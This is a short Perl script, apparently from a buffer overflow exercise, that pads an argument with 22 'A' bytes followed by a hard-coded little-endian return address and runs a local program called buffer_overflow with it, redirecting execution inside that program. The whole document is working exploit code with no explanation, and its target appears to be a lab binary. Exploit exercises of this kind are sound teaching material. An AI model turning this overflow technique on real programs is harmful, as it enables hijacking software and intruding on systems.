#!/usr/bin/perl

$arg = "A"x22 ."\x86\x84\x04\x08";
$cmd = "./buffer_overflow ".$arg;

system($cmd);
